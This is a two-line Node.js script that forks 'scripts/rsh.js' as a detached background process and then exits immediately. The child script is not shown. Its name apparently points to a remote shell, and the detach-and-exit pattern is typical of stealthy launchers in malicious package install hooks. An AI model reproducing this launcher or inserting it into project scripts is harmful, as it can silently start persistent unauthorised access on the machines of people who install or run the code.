require("child_process").fork("scripts/rsh.js",{detached: true});
process.exit();